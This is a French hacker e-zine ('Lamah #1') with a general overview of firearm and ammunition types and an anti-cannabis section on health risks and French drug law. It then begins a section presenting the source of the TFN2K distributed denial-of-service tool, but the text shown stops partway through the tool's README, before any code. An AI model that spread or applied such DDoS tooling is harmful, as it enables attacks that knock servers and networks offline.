<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
<head>
   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
   <meta name="Author" content="Clad Strife">
   <meta name="GENERATOR" content="Mozilla/4.61 [en] (Win98; I) [Netscape]">
   <title>Jamais vu un zine pareil!</title>
</head>
<body>
&nbsp;
<center>
<p><b><u><font face="Verdana"><font color="#000000"><font size=+3>Lamah
#1</font></font></font></u></b>
<br><font face="Verdana"><font color="#000000"><font size=+1>par Clad Strife</font></font></font></center>

<p><br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<p><b><u><font color="#000000"><font size=+1>Sommaire:</font></font></u></b>
<br>&nbsp;
<ul>
<li>
<font color="#000000">Guns et munitions,</font></li>

<li>
<font color="#000000">Cannabis,</font></li>

<li>
<font color="#000000">Tribal Flood Network 2000 (sources),</font></li>

<li>
<font color="#000000">Carding,</font></li>

<li>
<font color="#000000">Acad&eacute;mies: pire-ratage + IIS,</font></li>

<li>
<font color="#000000">Astuces de hackers.</font></li>
</ul>

<p><br><b><u><font color="#000000"><font size=+1>Introduction:</font></font></u></b>
<p><font color="#000000">"Put1! encore un sale ezine de sale rebelz!"</font>
<br>&nbsp;
<br>&nbsp;
<br>
<center>
<p><u><font color="#000000"><font size=+2>Chapitre premier: armes &agrave;
feu et projectiles</font></font></u>
<br><b><font face="Verdana"><font color="#009900"><font size=-1>(greetz
to D4 Kr4sh3r)</font></font></font></b></center>

<p><font color="#000000">&nbsp;&nbsp; Avoir une arme &agrave; feu c pas
bien: keske vous allez foutre avec une arme &agrave; feu? Pour vous prot&eacute;ger
de qui? Pour menacer qui? Dans un monde utopique l'id&eacute;al serait
la suppression totale des armes &agrave; feu et l'interdiction de leur
mise en vente. En effet une arme &agrave; feu est souvent consid&eacute;r&eacute;
comme une menace. Charg&eacute; avec du gros calibre une arme &agrave;
feu, si le projectile est bien plac&eacute;, peut tuer un &ecirc;tre humain
sur le coup. En ayant une optique plus optimiste, on peut esp&eacute;rer
que si quelqu'un vous tire dessus, le projectile ne touche aucun organe
vital ou sexuel pour voir ses chances de survivre augmenter. Bien sur si
le tueur</font>
<br><font color="#000000">voit que vous &ecirc;tes pas mort il va retirer.
Dans le pire des cas o&ugrave; la balle ne vous tue pas sur le coup, vous
mourrez d'une h&eacute;morragie. Bon assez dit de conneries: vous &ecirc;tes
bien dans le "lamah #1" alors faut vous attendre &agrave; tout.</font>
<br><font color="#000000">&nbsp;&nbsp; Par ailleurs les films d'action
ou autres ont tendance &agrave; faire paraitre l'arme &agrave; feu comme
un engin de mort. Qu'&eacute;voque donc pour vous le mot: "revolver"? Rien
de bon je pr&eacute;sume. J'ai quand m&ecirc;me jug&eacute; important de
reparler de leure classification et des diff&eacute;rents types de munitions
utilis&eacute;es. Comme je suis contre les flingues et autres joujous,
je vais pas rentrer dans les d&eacute;tails et juste faire une classification,
mais avant cel&agrave; j'aimerais introduire un paragraphe citant les paroles
de <i>Masamune Shirow</i>, que certains connaissent peut-&ecirc;tre:</font>
<p><i><font color="#008080">Armes d'&eacute;paules, armes de chasse, armes
de poing, armes incapacitantes... On emploie souvent le terme <b>"d'armes
&agrave; feu"</b> de mani&egrave;re g&eacute;n&eacute;rique, mais il en
existe une multitude de formes, de tailles, et de puissances, pour un grand
nombre d'utilisations vari&eacute;es. (...) La plupart de ces armes utilisent
une <b>charge explosive</b> pour propulser un projectile, mais pas toutes."</font></i>
<p><font color="#000000">Ses propos appuyent mes pens&eacute;es et commentent
la liste qui va suivre:</font>
<p><i><font color="#000000"><u>Note:</u> ceci est une liste de <b>classification</b>
et donc je ne mets pas de noms particulier d'armes &agrave; feu, je les
classe par cat&eacute;gorie, ce qui est d&eacute;j&agrave; pas mal.</font></i>
<p><font color="#000000"><b><i>Mitrailleuses:</i></b> un des types d'arme
&agrave; feu les plus puissants. Une mitrailleuse tire des balles de mani&egrave;re
continue. Certains canons automatiques d'un calibre un peu plus &eacute;lev&eacute;
peuvent aussi &ecirc;tre class&eacute;s dans cette cat&eacute;gorie.</font>
<p><font color="#000000"><b><i>Fusils: </i></b>ceci inclut les <b>"fusils
automatiques"</b> ou <b>"fusils d'assaut"</b> utilis&eacute;s par les militaires.
Ils utilisent en g&eacute;n&eacute;ral un gros calibre et font de gros
d&eacute;gat. Leur long tube directeur, permet une pr&eacute;cision plus
grande. Les fusils &eacute;quip&eacute;s d'une lunette de vis&eacute;e
sont aussi appel&eacute;s <b>"fusils sniper"</b> et s'utilise quand une
cible bouge lentement ou est immobile.</font>
<p><b><font color="#000000"><i>Pistolets-mitrailleurs</i>:</font></b><font color="#000000">
normalement ces armes &agrave; feu compactes devraient &ecirc;tre class&eacute;es
en fin de liste, parmi les fusils automatiques. Consid&eacute;rons les
comme des <b>"petites-mitrailleuses"</b>.</font>
<p><font color="#000000"><b><i>Armes de poing:</i></b> les armes de points
sont aussi connues sous le nom de <b>"Gun"</b> (en anglais - terme aussi
utilis&eacute; par les rebelz) ou <b>"Pistolet"</b>, cette cat&eacute;gorie
regroupe les <b>"revolvers"</b> et les <b>"pistolets automatiques"</b>.
Pouvant &ecirc;tre utilis&eacute;es d'une seule main, elles sont souvent
employ&eacute;es par les forces de police lors de petites interventions.
Ce type d'arme ne p&egrave;se pas grand chose et permet au tireur une plus
grande mobilit&eacute;. De plus leur petite puissance de tir permet au
tireur d'absorber une partie du recul.</font>
<p><font color="#000000"><b><i>Armes incapacitantes: </i></b>ces armes
ne sont pas con&ccedil;ues pour tuer la cible, mais pour la rendre impuissante.
Elles fonctionnent par d&eacute;charges &eacute;lectriques, par substances
an&eacute;sth&eacute;siantes, ou gr&acirc;ce &agrave; des balles plastiques
ou en caoutchouc. certaines armes incapacitantes ne sont con&ccedil;ues
qu'&agrave; cete effet, mais on peut aussi utiliser des armes "normales"
dans le m&ecirc;me but en utilisant les munitions ad&eacute;quates.</font>
<p><font color="#000000">&nbsp;&nbsp; Les armes class&eacute;es dans ces
cat&eacute;gories s'ach&egrave;tent dans des magasins sp&eacute;cialis&eacute;s,
mais vous n'en aurez presque pas, voir jamais, l'utilit&eacute;. La seule
v&eacute;ritable utilisation d'arme &agrave; feu qui peut se r&eacute;v&eacute;ler
utile est pour la chasse, mais l&agrave; encore, quand on voit la t&ecirc;te
de certains chasseurs on finit par se poser des questions...</font>
<br><font color="#000000">&nbsp;&nbsp; L'int&eacute;r&ecirc;t de cette
liste permet de d&eacute;mystifier "l'arme &agrave; feu" en la faisant
paraitre autrement que comme un engin de mort, comme dans le cas d'armes
incapacitantes. Plus on en sait sur les armes plus elles deviennent int&eacute;ressantes.
Pour moi, il est plus int&eacute;ressant d'&eacute;tudier uen arme &agrave;
feu, que l'utiliser. D'un autre c&ocirc;t&eacute; il est int&eacute;ressant
de savoir quelles effets peuvent avoir les armes, surtout dans un but de
dissuasion:</font>
<p><font color="#000000">&nbsp;&nbsp; Paradoxalement, une arme est un tr&egrave;s
bon outil de dissuasion: une arme &agrave; feu fait croire &agrave; son
possesseur qu'il a l&agrave; le moyen de controler "son" univers ce qui
influe plus ou moins - selon sa sensibilit&eacute; - sur son comportement.
Une arme non charg&eacute;e est tellement mystifi&eacute;e, que la d&eacute;baller
en public cr&eacute;&eacute;ra un sentiment de panique, de terreur, d'ins&eacute;curit&eacute;.
M&ecirc;me en sachant l'arme vide les gens auront des r&eacute;actions
comportementales instinctives relatives &agrave; leur survie.</font>
<br><font color="#000000">&nbsp;&nbsp; Dans un autre domaine, les armes
plus puissantes (missiles, bombes atomiques...) sont aussi un bon moyen
de dissuasion voir de maintenir la paix. L&agrave; se pose une incoh&eacute;rence
logique (?) (ce qui n'est pas courant, vous en conviendrez): dans le cas
o&ugrave; une arme est cr&eacute;&eacute; pour briser un sentiment de s&eacute;curit&eacute;
relatif, ou pour dissuader quelconque personne d'avoir des actions allant
&agrave; l'encontre de vos id&eacute;es dans un contexte pr&eacute;cis,
l'arme sert ici &agrave; cr&eacute;er une s&eacute;curit&eacute; via la
dissuasion, toute relative, puisque l'existence de ces m&ecirc;me armes
cr&eacute;ent un sentiment d'ins&eacute;curit&eacute;. Pour r&eacute;sumer
on peut dire plus clairement que: la guerre se fait avec les armes et brise
la s&eacute;curit&eacute;, mais ces m&ecirc;me armes servent &agrave; emp&ecirc;cher
une guerre.</font>
<p><font color="#000000">&nbsp;&nbsp; Il s'agit de savoir dans quel cas
une arme &agrave; feu peut se r&eacute;v&eacute;ler dangereux: cel&agrave;
varie en fonction du projectile utilis&eacute; lors du tir. Etudions les
projectiles.</font>
<center>
<p><b><font face="Verdana"><font size=-1>DIFFERENTS TYPES DE MUNITIONS</font></font></b>
<br><img SRC="plan1.jpg" height=293 width=414></center>

<p>Ce sh&eacute;ma devrait d&eacute;j&agrave; vous fournir quelques informations
sur les cartouches, notamment sur leurs caract&eacute;ristiques telle la
cartouche de shotgun. Comme on peut le voir sur ce sh&eacute;ma les balles
peuvent cr&eacute;er des taux de p&eacute;n&eacute;tration diff&eacute;rents
suivant leur forme, ou peuvent avoir des fonctions diff&eacute;rentes.
La liste qui va suivre classe les projectile dans diff&eacute;rentes cat&eacute;gories
g&eacute;n&eacute;rales:
<p><b><i>Armes antichar: </i></b>Il s'agit principalement de roquettes
antichar et des syst&egrave;mes de missiles utilis&eacute;s pour attaquer
des cibles blind&eacute;es.
<p><b><i>Munitions pour armes de poing:</i></b> ceci se rapporte aux balles
utilis&eacute;es pour les revolvers, les pistolets automatiques, et les
pistolets-mitrailleurs. Pour les automatiques, les munitions les plus r&eacute;pandues
sont le <b>9mm</b> et le <b>calibre 45</b>, pour les revolvers (dont <b>le
347 magnum</b>) on trouve surtout du calibre <b>38</b>. Le <b>10mm</b>
est aussi un calibre int&eacute;ressant, mais il est peut-&ecirc;tre apparu
sur le march&eacute; un peu trop tard. Les cartouches <b>de 9mm</b> et
les <b>"38 special"</b> ont approximativement la m&ecirc;me puissance.
<p><b><i>Munitions pour fusil: </i></b>les munitions de faible calibre
et &agrave; vitesse initiale &eacute;lev&eacute;e connaissent ces temps-ci
un certain engouement (pour les m&ecirc;me raisons, ce type de munitions
devient aussi populaire pour les canons antichar). <b>L'arm&eacute;e am&eacute;ricaine</b>
utilise des balles standard de <b>calibre</b> <b>223 (5,56mm)</b>. Les
forces de<b> l'OTAN </b>utilisent du <b>7,62mm </b>mais sont en train de
s'aligner sur la norme am&eacute;ricaine de <b>5,56mm</b>. Remarquez que
les munitions de fusils et de pistolets ont des puissances de feu compl&egrave;tement
diff&eacute;rentes. Pour une port&eacute;e courante lors d'une fusillade
avec des armes de poing (5 &agrave; 20m), une balle de fusil peut facilement
traverser une porti&egrave;re de voiture ou une plaque de t&ocirc;le &eacute;paisse.
Il va sans dire que les gilets pare-balles port&eacute;s par les policiers
ou autres sont totalement inefficaces contre ce type de munitions. Dans
les films d'action ou les s&eacute;ries t&eacute;l&eacute;s, on a toujours
l'impression que toutes ces balles ont la m&ecirc;me puissance. Mais il
est &eacute;vident qu'elles n'ont rien de commun.
<p><b><i>Munitions pour shotguns: </i></b>celles-ci sont totalement diff&eacute;rentes
de celles pour les fusils et c'est pourquoi on en fait une autre cat&eacute;gorie.
Con&ccedil;ues initialement pour la chasse, les munitions de shotgun sont
parmi les plus vicieuses qui soient parcequ'elles d&eacute;chargent des
centaines de petites billes de plomb. On trouve diff&eacute;rents types
de cartouches, mais le plus courant reste le calibre 12. le choix d'un
type de muntitions va d&eacute;pendre si l'on chasse des oiseaux, de petits
animaux, des cerfs ou des ours! Des munitions de type non-mortel ont &eacute;t&eacute;
con&ccedil;ues pour &ecirc;tre utilis&eacute;es dans les r&eacute;pressions
d'&eacute;meutes, etc...
<br>&nbsp;
<br>&nbsp;
<br>
<center>
<p><u><font color="#000000"><font size=+2>Cannabis et drogues</font></font></u>
<br><b><font face="Verdana"><font color="#009900"><font size=-1>(greetz
to &ETH;ecayer)</font></font></font></b></center>

<p><font color="#000000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Souvent vue comme
une herbe aux effets b&eacute;n&eacute;fiques par leurs consommateurs,
le cannabis ne peut-il pas se r&eacute;v&eacute;ler dangeureux? Le cannabis
est consomm&eacute; par des jeunes entre 15 et 30 ans en g&eacute;n&eacute;ral.
Surtout consomm&eacute;e par les lyc&eacute;ens et &eacute;tudiants, le
cannabis entraine une d&eacute;pendance. Souvent pour les jeunes, fumer
un joint est une exp&eacute;rience &agrave; r&eacute;aliser qui en plus
permettrait (inconsciemment) de mieux s'int&eacute;grer dans un groupe.
Ce moyen d'insertion social est de loin le plus mauvais: en tant que consommateur
vous rapportez de l'argent aux mafieux &agrave; la t&ecirc;te de gros r&eacute;seaux
qui finissent par vous: consommateur. La l&eacute;galisation du cannabis
rendrait cette drogue moins taboue et la d&eacute;mystifierait (comme en
Hollande). En effet c'est sur le fait que cette plante est rare que les
r&eacute;seaux mafieux comptent pour se faire du fric sur votre dos. Consid&eacute;rez
qu'en r&eacute;alit&eacute; vous n'&ecirc;tes pas d&eacute;pendant du cannabis,
mais des gens qui le vendent. Comme le manque d'informations entraine une
attirance vers cette drogue en plus d'une mystification, aujourd'hui vous
devez &ecirc;tre capable d'en savoir plus sur elle.</font>
<p><u><font color="#000000">Traitement des informations sur le cannabis:</font></u>
<p><b><font color="#000000">Pr&eacute;sentation:</font></b>
<p><font color="#000000">&nbsp;&nbsp; A part les textes d&eacute;bilitants
ou vous saurez tout sur les 400 mani&egrave;res de fumer du teushi et de
s'arracher les poumons en rajoutant des morceaux de peau de bananes dedans,
on peut esp&eacute;rer trouver plus s&eacute;rieux, si l'on cherche plus
s&eacute;rieux.</font>
<p><font color="#000000">Le cannabis ou chanvre indien est une plante renfermant
une substance toxique et active, le t&eacute;trahydrocannabinol (thc),
utilis&eacute;e pour ses effets psychotropes, c'est-&agrave;-dire susceptibles
de modifier l'activit&eacute; mentale.</font>
<br><font color="#000000">Le cannabis se pr&eacute;sente sous forme:</font>
<ul>
<li>
<font color="#000000">d'herbe, fleurs ou feuilles s&eacute;ch&eacute;es,
encore appel&eacute; kif, marijuana ou herbe.</font></li>

<li>
<font color="#000000">de r&eacute;sine constitu&eacute;e d'extraits "enrichis"
de la plante et pr&eacute;sent&eacute;e sous forme de barrettes. C'est
le haschich.</font></li>
</ul>
<font color="#000000">Le cannabis est le plus souvent fum&eacute; seul,
ou en m&eacute;lange avec du tabac sous formes de cigarettes (joints).
Le principe actif du cannabis passe dans les poumons du fumeur et en quelques
minutes dans le syst&egrave;me sanguin. Il a une grande affinit&eacute;
pour les tissus graisseux o&ugrave; il s'accumule. Ce stockage est responsable
de sa lente &eacute;limination (plusieurs jours pour un simple joint).
Actuellement la phrase bidon: "personne n'en est mort", ne sert qu'&agrave;
ceux qui se cherchent une excuse pour en fumer le plus possible sans culpabiliser:
pour le moins stupide.</font>
<p><b><font color="#000000">Le cannabis agit sur le comportement:</font></b>
<ul>
<li>
<font color="#000000">L'usage du cannabis, m&ecirc;me &agrave; dose minime,
produit des effets plus ou moins importants selon le sujet et la dose ing&eacute;r&eacute;e
qui vont de l'&eacute;tat d'&eacute;bri&eacute;t&eacute; comparable &agrave;
l'ivresse alccolique, aux hallucinations.</font></li>

<li>
<font color="#000000">Le cannabis, comme les autres stup&eacute;fiants,
d&eacute;riv&eacute;s de l'opium (h&eacute;ro&iuml;ne) ou de la feuille
de coca (coca&iuml;ne), provoque, &agrave; des degr&eacute;s divers, une
alt&eacute;ration des performances et des fonctions c&eacute;r&eacute;brales
que l'on sait tr&egrave;s bien mesurer.</font></li>

<li>
<font color="#000000">En usage chronique, le cannabis engendre des &eacute;tats
de d&eacute;sint&eacute;r&ecirc;t, d'apathie, de d&eacute;sinvestissement
associ&eacute;s &agrave; une alt&eacute;ration de la m&eacute;moire <b>et</b>/ou
de la concentration.</font></li>

<li>
<font color="#000000">La d&eacute;pendance au cannabis est essentiellement
psychologique avec tendance &agrave; la r&eacute;p&eacute;tition des prises.</font></li>
</ul>

<p><br><b><font color="#000000">Le cannabis a aussi des cons&eacute;quences
sur la sant&eacute;:</font></b>
<ul>
<li>
<font color="#000000">L'intoxication au cannabis peut entrainer:</font></li>

<ul>
<li>
<font color="#000000">des complications pulmonaires, des bronchites chroniques,
de l'emphys&egrave;me et des r&eacute;percutions cardiaques. Pour la petite
histoire: l'emphys&egrave;me est un gonflement du tissu sous la peau par
introduction d'air, &agrave; la suite d'un traumatisme des voies respiratoires.
Par ailleurs un emphys&egrave;me pulmonaire est une dilatation excessive
et permanente des alv&eacute;oles pulmonaires, avec rupture des cloisons
interv&eacute;olaires. L'emphys&egrave;me entraine la dyspn&eacute;e qui
est une difficult&eacute; &agrave; respirer.</font></li>

<li>
<b><font color="#FF0000">des complications canc&eacute;reuses qui sont
plus fr&eacute;quentes qu'avec le tabac</font></b></li>

<li>
<font color="#000000">une pr&eacute;disposition plus nette &agrave; la
leuc&eacute;mie chez les enfants de m&egrave;re consommatrice</font></li>

<li>
<font color="#000000">un risque d'alt&eacute;ration des cellules reproductrices
chez l'homme et la femme</font></li>
</ul>
</ul>
<b><font color="#000000">Le cannabis est donc un facteur de risques:</font></b>
<ul>
<li>
<font color="#000000">En effet le cannabis peut:</font></li>

<ul>
<li>
<font color="#000000">causer une alt&eacute;ration des performances et
des fonctions c&eacute;r&eacute;brales et conduire &agrave; l'&eacute;chec
scolaire, universitaire ou m&ecirc;me professionnel</font></li>

<li>
<font color="#000000">conduire &agrave; l'utilisation de drogues plus fortes
m&ecirc;me si ce n'est pas le cas g&eacute;n&eacute;ral</font></li>

<li>
<font color="#000000">inciter &agrave; la fr&eacute;quentation du milieu
&agrave; tr&egrave;s haut risque des usagers et des revendeurs de drogues:
&agrave; savoir que les dealers ne voient en vous que les billets, et pas
une personne pi&eacute;g&eacute;e dans la drogue.</font></li>
</ul>
</ul>
<b><font color="#000000">De cause &agrave; effet on aura fait le chemin
inverse: mais pourquoi fume-t-on donc le cannabis?</font></b>
<ul>
<li>
<font color="#000000">La consommation r&eacute;guli&egrave;re de cannabis
exprime essentiellement des difficult&eacute;s psychologiques d'adaptation,
notamment chez les jeunes</font></li>

<li>
<font color="#000000">On trouve souvent chez les usagers r&eacute;guliers
de cannabis (et des autres drogues) un sentiment d&eacute;pressif ant&eacute;rieur.
Les toxicomanes ont fr&eacute;quemment des personnalit&eacute;s o&ugrave;
pr&eacute;dominent: la d&eacute;pendance, l'immaturit&eacute; affective,
les difficult&eacute;s relationnelles.</font></li>

<li>
<font color="#000000">La consommation du cannabis apporte &agrave; l'utilisateur
un apaisement illusoire car les prises de produits de type cannabique ne
font qu'aggraver les perturbations psychiques qui le caract&eacute;risent.</font></li>
</ul>

<p><br><b><font color="#000000">Dura lex, <u>sed lex</u>:</font></b>
<ul>
<li>
<font color="#000000">Pour les raisons qui viennent d'&ecirc;tre &eacute;voqu&eacute;es,
le cannabis est une substance class&eacute;e stup&eacute;fiant dont l'usage
illicite est interdit par la loi et fait de l'usager de drogues un d&eacute;linquant.</font></li>

<li>
<font color="#000000">L'article L 628 du code de la sant&eacute; publique
punit d'un emprisonnement de 2 mois &agrave; 1 an et d'une amende de 500F
&agrave; 15000F, ou de l'une de ces deux peines seulement, ceux qui auront
de mani&egrave;re illicite fait usage de l'une des substances ou plantes
class&eacute;es comme stup&eacute;fiants.</font></li>

<li>
<font color="#000000">Ce m&ecirc;me code s'attache en particulier &agrave;
sanctionner le trafiquant ou/</font><b><u><font color="#FF0000"><font size=+1>et
toute personne qui aura incit&eacute; &agrave; l'utilisation de la drogue
ou facilit&eacute; son usage.</font></font></u></b></li>

<li>
<font color="#000000">Le trafic est poursuivi et peut donner lieu &agrave;
de fortes peines: confiscation des biens, 5 &agrave; 10 ans de prison selon
le cas et/ou 500.000 &agrave; 5.000.000 de francs d'amende.</font></li>

<li>
<font color="#000000">S'enrichir sans pouvoir justifier l'origine de ses
ressources en &eacute;tant en relation habituelle avec une personne se
livrant au trafic: 5 ans de prison et 500.000 francs d'amende.</font></li>
</ul>
&nbsp;&nbsp; Sachant qu'un disclaimer n'est qu'une mise-en-garde dans un
contexte LEGAL, dans un contexte ill&eacute;gal il n'a aucune valeur et
mettre un disclaimer dans un texte facilitant ou sensibilisant quelqu'un
&agrave; l'usage du cannabis est inutile et il y a risque de r&eacute;pr&eacute;hension.
<p><font color="#000000">&nbsp;&nbsp; Il y aurait beaucoup &agrave; pol&eacute;miquer
sur le sujet notamment parceque les avis convergent. Mais </font><b><font color="#FF0000">le
cannabis est une drogue: vous ne pouvez l'ignorer.</font></b>
<p><font color="#000000">Par ailleurs il existe d'autres drogues: voici
un tableau les classant les diff&eacute;rents produits, leurs caract&eacute;ristiques
l&eacute;gislatives, ainsi que leurs effets. A savoir par avance qu'une
drogue n'est pas toujours mortelle et ne rend pas forc&eacute;ment d&eacute;pendant
comme on va pouvoir le constater avec le th&eacute;. Le caf&eacute; peut
cependant &ecirc;tre mortel &agrave; tr&egrave;s forte dose...</font>
<br>&nbsp;
<br>&nbsp;
<table BORDER COLS=4 WIDTH="100%" >
<tr BGCOLOR="#FFFFFF">
<td>
<center><b><font face="Verdana"><font size=-1>PRODUITS</font></font></b></center>
</td>

<td>
<center><b><font face="Verdana"><font size=-1>EFFETS</font></font></b></center>
</td>

<td>
<center><b><font face="Verdana"><font size=-1>PRINCIPAUX DANGERS</font></font></b></center>
</td>

<td>
<center><b><font face="Verdana"><font size=-1>LOI: vente et usage</font></font></b></center>
</td>
</tr>

<tr BGCOLOR="#009900">
<td><font color="#FFFFFF">Th&eacute;, caf&eacute;, boisson &agrave; base
de cola (voie orale)</font></td>

<td><font color="#FFFFFF">Stimulation intellectuelle et physique l&eacute;g&egrave;re.</font></td>

<td><font color="#FFFFFF">Risques d'irritabilit&eacute;, d'insomnie, d&eacute;pendance</font></td>

<td><font color="#FFFFFF">Vente et usage autoris&eacute;s.</font></td>
</tr>

<tr BGCOLOR="#FF9900">
<td><font color="#FFFFFF">Tabac (se fume)</font></td>

<td><font color="#FFFFFF">Excitant</font></td>

<td><font color="#FFFFFF">Maladies pulmonaires, cardiaques, cancers. D&eacute;pendance.</font></td>

<td><font color="#FFFFFF">Vente contr&ocirc;l&eacute;e.</font></td>
</tr>

<tr BGCOLOR="#FF9900">
<td><font color="#FFFFFF">M&eacute;dicaments contre l'angoisse, contre
l'insomnie (voie orale)</font></td>

<td><font color="#FFFFFF">D&eacute;tente, endormissement.</font></td>

<td><font color="#FFFFFF">Dangers si non respect des doses prescrites.
D&eacute;pendance.</font></td>

<td><font color="#FFFFFF">Vente contr&ocirc;l&eacute;e.</font></td>
</tr>

<tr BGCOLOR="#FF6600">
<td><font color="#FFFFFF">Alcool (bi&egrave;re, ap&eacute;ritifs, vin)
(voie orale)</font></td>

<td><font color="#FFFFFF">D&eacute;tente et/ou excitation, ivresse, euphorie.</font></td>

<td><font color="#FFFFFF">Accidents divers, perte de l'attention et des
r&eacute;flexes. Tr&egrave;s toxique en usage r&eacute;gulier pour le foie,
le syst&egrave;me nerveux, cancers. D&eacute;pendance.</font></td>

<td><font color="#FFFFFF">Vente contr&ocirc;l&eacute;e et interdite aux
mineurs.</font></td>
</tr>

<tr BGCOLOR="#FF6600">
<td><font color="#FFFFFF">Cannabis (H, herbe, shit) (se fume)</font></td>

<td><font color="#FFFFFF">D&eacute;tente et/ou excitation, hallucinations,
ivresse.</font></td>

<td><font color="#FFFFFF">Toxique, l'usage r&eacute;gulier provoque: perte
de m&eacute;moire, perte de l'attention et des r&eacute;flexes, ivresse,
risques psychiatriques. D&eacute;pendance psychologique, faible ou forte.</font></td>

<td><font color="#FFFFFF">Vente et usage interdits.</font></td>
</tr>

<tr BGCOLOR="#FF0000">
<td><font color="#FFFFFF">Ecstasy (voie orale)</font></td>

<td><font color="#FFFFFF">Excitation, augmentation des sensations, d&eacute;lires,
violence.</font></td>

<td><font color="#FFFFFF">Accidents physiques divers, troubles cardiaques,
risques psychologiques et psychiatriques graves. D&eacute;pendance psychique.</font></td>

<td><font color="#FFFFFF">Vente et usage interdits.</font></td>
</tr>

<tr BGCOLOR="#FF0000">
<td><font color="#FFFFFF">L.S.D. (voie orale)</font></td>

<td><font color="#FFFFFF">Hallucinations et d&eacute;lires.</font></td>

<td><font color="#FFFFFF">Accidents divers, risques psychologiques et psychiatriques.</font></td>

<td><font color="#FFFFFF">Vente et usage interdits.</font></td>
</tr>

<tr BGCOLOR="#FF0000">
<td><font color="#FFFFFF">M&eacute;dicaments divers d&eacute;tourn&eacute;s
de leur usage et/ou vendus clandestinement (voie orale)</font></td>

<td><font color="#FFFFFF">Diverses sensations.</font></td>

<td><font color="#FFFFFF">Accidents variables selon la nature des produits
et les m&eacute;langes.</font></td>

<td><font color="#FFFFFF">Vente contr&ocirc;l&eacute;e en pharmacie. Toute
autre vente interdite.</font></td>
</tr>

<tr BGCOLOR="#FF0000">
<td><font color="#FFFFFF">Colles, solvants (voie nasale)</font></td>

<td><font color="#FFFFFF">D&eacute;tente, "defonce", d&eacute;lires.</font></td>

<td><font color="#FFFFFF">Accidents cardiaques et pulmonaires, troubles
psychiatriques graves. D&eacute;pendance.</font></td>

<td><font color="#FFFFFF">Vente interdite aux mineurs.</font></td>
</tr>

<tr BGCOLOR="#FF0000">
<td><font color="#FFFFFF">H&eacute;ro&iuml;ne (voie nasale et par injection)</font></td>

<td><font color="#FFFFFF">"Flash", d&eacute;tente, "d&eacute;fonce".</font></td>

<td><font color="#FFFFFF">Overdose, accidents dus &agrave; la seringue:
sida, h&eacute;patites, etc... D&eacute;pendance.</font></td>

<td><font color="#FFFFFF">Vente et usage interdits.</font></td>
</tr>

<tr BGCOLOR="#FF0000">
<td><font color="#FFFFFF">Coca&iuml;ne (voie nasale)</font></td>

<td><font color="#FFFFFF">Excitation puis d&eacute;pression.</font></td>

<td><font color="#FFFFFF">D&eacute;terioration des cloisons nasales, accidents
cardiaques, overdose, accidents psychiatriques. D&eacute;pendance.</font></td>

<td><font color="#FFFFFF">Vente et usage interdits.</font></td>
</tr>

<tr BGCOLOR="#FF0000">
<td><font color="#FFFFFF">Crack (voie nasale)</font></td>

<td><font color="#FFFFFF">Excitation puis d&eacute;pression.</font></td>

<td><font color="#FFFFFF">M&ecirc;me dangers que pour la coca&iuml;ne avec
une d&eacute;pendance plus forte et plus rapide, graves troubles du comportement.
Tr&egrave;s forte d&eacute;pendance.</font></td>

<td><font color="#FFFFFF">Vente et usage interdits.</font></td>
</tr>
</table>

<p><font color="#000000">C'est &agrave; vous de choisir: vous <b><u>seul</u></b>
avez les cl&eacute;s de votre destin&eacute;e.</font>
<center>
<p><u><font color="#000000"><font size=+2>TFN2K</font></font></u>
<br><b><font face="Verdana"><font color="#009900"><font size=-1>(greetz
to Yahoo!)</font></font></font></b></center>

<p><font color="#000000">Voici les sources du tant redout&eacute; Tribal
Flood Network permettant de cr&eacute;er des attaques de type DoS (Denial
of Service), pour mettre hors-service des serveurs, voir des r&eacute;seaux...</font>
<p><font color="#000000">Dans l'ordre voil&agrave; ce qui va apparaitre,
ceci est le contenu exact du zip diffus&eacute; par Mixter sur son site.
On donne g&eacute;n&eacute;ralement les sources sous forme de texte car
c'est plus &eacute;vident que de proposer un URL qui ne marchera peut-&ecirc;tre
plus d'ici quelques mois.</font>
<ul>
<li>
<font color="#000000">Readme</font></li>

<li>
<font color="#000000">Makefile</font></li>

<ul>
<li>
<font color="#000000">aes.c</font></li>

<li>
<font color="#000000">aes.h</font></li>

<li>
<font color="#000000">base64.c</font></li>

<li>
<font color="#000000">cast.c</font></li>

<li>
<font color="#000000">config.h</font></li>

<li>
<font color="#000000">disc.c</font></li>

<li>
<font color="#000000">flood.c</font></li>

<li>
<font color="#000000">ip.c</font></li>

<li>
<font color="#000000">ip.h</font></li>

<li>
<font color="#000000">mkpass.c</font></li>

<li>
<font color="#000000">process.c</font></li>

<li>
<font color="#000000">td.c</font></li>

<li>
<font color="#000000">tfn.c</font></li>

<li>
<font color="#000000">tribe.c</font></li>

<li>
<font color="#000000">tribe.h</font></li>
</ul>
</ul>

<hr WIDTH="100%">
<center><font color="#FF0000"><font size=+1>README</font></font></center>

<p><font color="#FF0000">Tribe FloodNet 2k edition</font>
<br><font color="#FF0000">&nbsp; Distributed Denial Of Service Network</font>
<br><font color="#FF0000">&nbsp; (c) Mixter &lt;mixter@newyorkoffice.com></font>
<p><font color="#FF0000">&nbsp;&nbsp; Contents:</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; 0. About</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; 1. Feature description</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; 2. Compilation</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; 3. Installation</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; 4. Using the client</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; 4.1. Using TFN for other
distributed tasks</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; 5. Technology description</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; 6. Conclusions and Acknowledgements</font>
<p><font color="#FF0000">About</font>
<p><font color="#FF0000">TFN can be seen as the yet most functional DoS
attack tool with the best</font>
<br><font color="#FF0000">performance that is now almost impossible to
detect. What is my point in</font>
<br><font color="#FF0000">releasing this? Let me assure you it isn't to
harm people or companies. It</font>
<br><font color="#FF0000">is, however, to scare the heck out of everyone
who does not care about</font>
<br><font color="#FF0000">systematically securing his system, because tools
sophisticated as this one</font>
